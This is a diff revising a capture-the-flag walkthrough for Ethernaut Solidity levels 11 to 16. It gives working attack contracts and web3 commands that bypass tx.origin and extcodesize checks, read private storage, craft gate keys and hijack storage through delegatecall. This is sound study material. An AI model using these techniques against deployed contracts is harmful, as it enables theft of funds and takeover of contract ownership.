@@ -186,95 +186,98 @@ contract AttackReentrancy {
 ```
 
 ## 11. Elevator
-Since `building.isLastFloor()` is not a view function, you could implement it in such a way where it returns a different value everytime it is called, even if it is called in the same function. Moreover, even if it were to be changed to a view function, you could also still [attack it](https://github.com/OpenZeppelin/ethernaut/pull/123#discussion_r317367511).
+Ngl though, I thought that this was quite a stupid level. Conditional ifs to return different values isn't really what I would call an attack. This is a very common usecase e.g. if I have no tokens, I can't transfer anything.
 
-Note: You don't have to inherit an interface for the sake of doing it. It helps with the abstract constract checks when the contract is being compiled. As you can see in my implementation below, I just needed to implement `isLastFloor()` because at the end of the day, it still gets encoded into a hexidecimal function signature and as long as this particular signature exists in the contract, it will be called with the specified params. 
+Nevertheless, the solution to this floor is basically to have a function return different values when called multiple times in the same transaction. I used a bool flag since that's sufficient to clear the level.
 
-Sometimes `.call()` gives you a bad estimation of the gas required so you might have to manually configure how much gas you want to send along with your transaction. 
+Note: If your floor is not updated for some reason, take a look at the transaction. There might not be enough gas supplied for the entire transaction to be executed.
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-contract AttackElevator  {
-    bool public flag; 
-    
-    function isLastFloor(uint) public returns(bool) {
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+}
+
+contract AttackBuilding is Building {
+    bool public flag;
+
+    function isLastFloor(uint) external override returns(bool) {
         flag = !flag;
         return !flag;
     }
-    
-    function forceTopFloor(address _victim) public {
+
+    function attack(address _victim) public {
         bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
         _victim.call(payload);
     }
-   
 }
 ```
 
 ## 12. Privacy
-This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]` but you need to first determine what position it is at. You can learn more about how storage variables are stored on the smart contract [here](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage). From that, we can tell that `data[2]` is stored at index 5! It's not supposed to be at index 4 because arrays are 0 based so when you want to get value at index 2, you're actually asking for the 3 value of the array i.e. index 5!! Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).
+This level is very similar to that of the level 8 Vault. In order to unlock the function, you need to be able to retrieve the value stored at `data[2]`. To do that, we need to determine the position of where `data[2]` is stored on the contract.
 
-Note: Just a bit more details about the packing of storage variables. The 2 `uint8` and 1 `uint16` are packed together on storage according to the order in which they appeared in the smart contract. In my case, when i did `await web3.eth.getStorageAt(instance, 2)`, I had a return value of `0x000000000000000000000000000000000000000000000000000000004931ff0a`. The last 4 characters of your string should be the same as mine because our contracts both have the same values for `flattening` and `denomination`. 
+I used to link the solidity docs but the path keeps changing so just google "storage layout solidity docs" and find the latest one to read.
 
-`flattening` has a value of 10 and its hexidecimal representation is `0a` while `denomination` has a value of 255 and has a hexidecimal representation of `ff`. The confusing part is the last one which is supposed to represent `awkwardness` which is of type `uint16`. Since `now` returns you a uint256 (equivalent of block.timestamp i.e. the number of seconds since epoch), when you convert `4931` as a hex into decimals, you get the values `18737`. This value can be obtained by doing `epochTime % totalNumberOfPossibleValuesForUint16` i.e. `1585269041 % 65536 = 18737`. The biggest value for `uint16` is `65535` but to determine all possible values, you need to add `1` to `65535` more to also include 0. Hopefully this explanation helps you to better understand how values are packed at the storage level!
+From the docs, we can tell that `data[2]` is stored at index 5. Index 0 contains the value for `locked`, index 1 contains the value for `ID`, index 2 contains the values for `flattening`, `denomination` and `awkwardness` (they're packed together to fit into a single bytes32 slot), index 3 contains the value for `data[0]` and finally, index 4 contains the value for `data[1]`.
+
+Astute readers will also notice that the password is actually casted to bytes16! So you'd need to know what gets truncated when you go from bytes32 to byets16. You can learn about what gets truncated during type casting [here](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).
+
 ```
 var data = await web3.eth.getStorageAt(instance, 5);
-var key = data.slice(2, 34);
+var key = '0x' + data.slice(2, 34);
 await contract.unlock(key);
 ```
 
 ## 13. Gatekeeper One
 This level is probably the most challenging so far since you'll need to be able to pass 5 conditional checks to be able to register as an entrant.
 
-1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
-2. `gateTwo` requires some trial and error regarding how much gas you should use. The simplest way to do this is to use `.call()` because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the `gasleft()%8191 == 0`. For me, this is 254 gas so to pass this gate, I just needed to use a gas equivalent to some multiple of 8191 + 254 e.g. 8191 * 100 + 254 = 819354. This [spreadsheet](https://docs.google.com/spreadsheets/u/1/d/1n6mRqkBz3iWcOlRem_mO09GtSKEKrAsfO7Frgx18pNU/edit#gid=0) of opcodes gas cost might help... but honestly, just playing with the debugger should work.
-3. To solve `gateThree`, it makes more sense to work backwards i.e. solve part 3 then part 2 then part 1 because even if you could pass part 1, your solution for part 1 may not pass part 2 and so on. Play around with remix while using [this](https://www.tutorialspoint.com/solidity/solidity_conversions.htm) to help you better understand what gets truncated when doing explicit casting. If you know how to do bit masking, this gate should be a piece of cake for you! Quick tip - you can ignore the `uint64()` when trying to solve this gate.
+1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address.
+2. `gateTwo` requires some trial and error regarding how much gas you should use. The simplest way to do this is to use `.call()` because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the `gasleft()%8191 == 0`. For me, this is 254 gas so to pass this gate, I just needed to use a gas limit of some multiple of 8191 + 254 e.g. 8191 * 100 + 254 = 819354.
+3. To solve `gateThree`, play around with remix while using [this](https://www.tutorialspoint.com/solidity/solidity_conversions.htm) to help you better understand what gets truncated when doing explicit casting. If you know how to do bit masking, this gate should be a piece of cake for you!
 
-For some strange reason, my solution wouldn't pass on Ropsten but passed locally on remix.
+
 ```
-pragma solidity ^0.5.0;
+pragma solidity ^0.8.0;
 
-// Remix account[0] address = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c
 
 contract AttackGatekeeperOne {
     address public victim;
-    
+
     constructor(address _victim) public {
         victim = _victim;
     }
-    
+
     // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
     // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
     // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
-    
 
-    function part3(bytes8 _gateKey) public view returns(bool) {
-        // _gateKey has 16 characters
-        // uint16(msg.sender) = truncating everything else but the last 4 characters of my address (733c) and converting it into uint16 returns 29500
-        // for uint32 == uint16, the former needs to be left padded with 0s e.g. 00001234 == 1234 = true
-        // solving uint32(uint64(_gateKey)) is trivial because it is the same as described above.
-        // This function will return true for any _gateKey with the values XXXXXXXX0000733c where X can be hexidecimal character.
-        return uint32(uint64(_gateKey)) == uint16(msg.sender);
-    }
-    
-    function part2(bytes8 _gateKey) public pure returns(bool) {
-        // This is saying that the truncated version of the _gateKey cannot match the original
-        // e.g. Using 000000000000733c will fail because the return values for both are equal
-        // However, as long as you can change any of the first 8 characters, this will pass.
-        return uint32(uint64(_gateKey)) != uint64(_gateKey);
-    }
-    
     function part1(bytes8 _gateKey) public pure returns(bool) {
-        // you can ignore the uint64 casting because it appears on both sides.
-        // this is equivalent to uint32(_gateKey) == uint64(_gateKey);
-        // the solution to this is the same as the solution to part3 i.e. you want a _gateKey where the last 8 digits is the same as the last 4 digits after
-        // it is converted to a uint so something like 0000733c will pass.
+        // Downcasting from a bigger uint to a smaller uint truncates from the left
+        // so going from uint64 to uint16 will remove the first 12 characters.
+        // For this to pass, we need to ensure that characters 9-12 are 0s
+        // So for example, something like 0000000000001234 will work since
+        // it'll compare 00001234 with 1234
         return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
     }
-    
-    // So the solution to this is to use XXXXXXXX0000<insert last 4 characters of your address> where X can be any hexidecimal characters except 00000000.
+
+    function part2(bytes8 _gateKey) public pure returns(bool) {
+        // This is saying that the truncated version of the _gateKey cannot match the original
+        // e.g. Using 0000000000001234 will fail because the return values for both are equal
+        // However, as long as you can change any of the first 8 characters, this will pass e.g. 1122334400001234
+        return uint32(uint64(_gateKey)) != uint64(_gateKey);
+    }
+
+    function part3(bytes8 _gateKey) public view returns(bool) {
+        // _gateKey has 16 hexidecimal characters
+        // uint16(msg.sender) truncates everything else but the last 4 characters of your address (for mine, it's BeC2)
+        // The rest is the same as part 1 so this function will return true for any _gateKeys with the value
+        // 0x********0000BeC2 where * represents any hexidecimal characters (0-f) except 0000
+        return uint32(uint64(_gateKey)) == uint16(uint160(address(msg.sender)));
+    }
+
     function enter(bytes8 _key) public returns(bool) {
         bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
-        (bool success,) = victim.call.gas(819354)(payload);
+        (bool success,) = victim.call{gas: 819354}(payload);
         require(success, "failed somewhere...");
     }
 }
@@ -283,57 +286,40 @@ contract AttackGatekeeperOne {
 ## 14. Gatekeeper Two
 Very similar to the previous level except it requires you to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.
 
-1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address. 
-2. `gateTwo` stumped me for a little while because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor! When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed! 
+1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address.
+2. `gateTwo` stumped me for a little while because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor! When first deploy a contract, the extcodesize of that address is 0 until the constructor is completed!
 3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.
 
+Note that as of solidity 0.8.0, you cannot do uint64(0) - 1 unless it's done inside an uncheck scope so I've modified it to type(uint64).max.
+
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 contract AttackGatekeeperTwo {
-    
-    constructor(address _victim) public {
-        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
+
+    constructor(address _victim) {
+        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
         bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
         (bool success,) = _victim.call(payload);
         require(success, "failed somewhere...");
     }
-    
-    
+
     function passGateThree() public view returns(bool) {
         // if a ^ b = c then a ^ c = b;
-        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) = uint64(0) - 1
-        // therefore uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 = uint64(_gateKey) 
-        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1;
-        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == uint64(0) - 1;
+        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1 
+        // can be rewritten as
+        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey) 
+        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
+        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == type(uint64).max;
     }
 }
 ```
 
 ## 15. Naught Coin
-Just approve another address to take the coins out on behalf of player. Note that you will need to know how to generate the data payload using `web3.eth.encodeFunctionCall`. Once you have the `data` payload, you need to initiate the `web3.eth.sendTransaction` while the selected account on metamask is the spender's account. The reason for this is because `transferFrom()` checks the allowance of msg.sender. 
-```
-web3.eth.abi.encodeFunctionCall({
-    name: 'transferFrom',
-    type: 'function',
-    inputs: [{
-        type: 'address',
-        name: 'sender'
-    },{
-        type: 'address',
-        name: 'recipient'
-    },{
-        type: 'uint256',
-        name: 'amount'
-    }]
-}, ['<insert owner address here>', '<insert spender address here>', '1000000000000000000000000']);
+I do not quite understand the purpose of this level either. Perhaps it is to remind the developer to be careful when implementing the business logic and to ensure that other functions cannot somehow bypass it e.g. using `transferFrom` to bypass the `lockTokens` modifier on `transfer`.
 
-await web3.eth.sendTransaction({
-    to: "<insert address of contract instance here>",
-    from: "<insert address of spender>",
-    data: "<insert data payload here>"
-})
-```
+The solution is to just approve another address to take the coins out on behalf of player. You can find a minimal ERC20 token contract on the internet, load the level instance on remix and interact with the contract through remix.
+
 
 ## 16. Preservation
 You need to understand how `delegatecall` works and how it affects storage variables on the calling contract to be able to solve this level. Essentially, when you try to do `delegatecall` and call the function `setTime()`, what's happening is that it is not just applying the logic of `setTime()` to the storage variables of the calling contract, it is also preserving the index of `storedTime` in the calling contract and using that as a reference as to which variable should it update. In short, the `LibraryContract` is trying to modify the variable at index 0 but on the calling contract, index 0 is the address of `timeZone1Library`. So first you need to call `setTime()` to replace `timeZone1Library` with a malicious contract. In this malicious contract, `setTime()` which will modify index 3 which on the calling contract is the owner variable!
